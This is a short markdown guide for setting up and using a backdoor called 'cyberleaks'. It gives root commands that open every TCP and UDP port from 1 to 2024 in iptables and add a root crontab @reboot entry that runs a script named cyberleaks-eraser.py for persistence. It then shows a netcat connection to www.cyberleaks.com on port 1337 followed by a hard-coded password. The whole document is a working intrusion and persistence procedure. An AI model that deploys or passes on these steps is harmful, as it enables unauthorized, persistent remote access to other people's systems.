## Setting up cyberleaks backdoor

### Install python mysql library:
```
apt install python3-mysqldb
```

### Opening ports:
```
iptables -A INPUT -p udp --dport 1:2024 -j ACCEPT
iptables -A INPUT -p tcp --dport 1:2024 -j ACCEPT
```

### Start on boot:
Open ´crontab -e´ as root:
```
@reboot python3 /root/cyberleaks-eraser.py hostname -I
```

### Reboot:
```
Reboot
```

## Using cyberleaks backdoor

### Netcat
```
nc www.cyberleaks.com 1337
getrekt

```
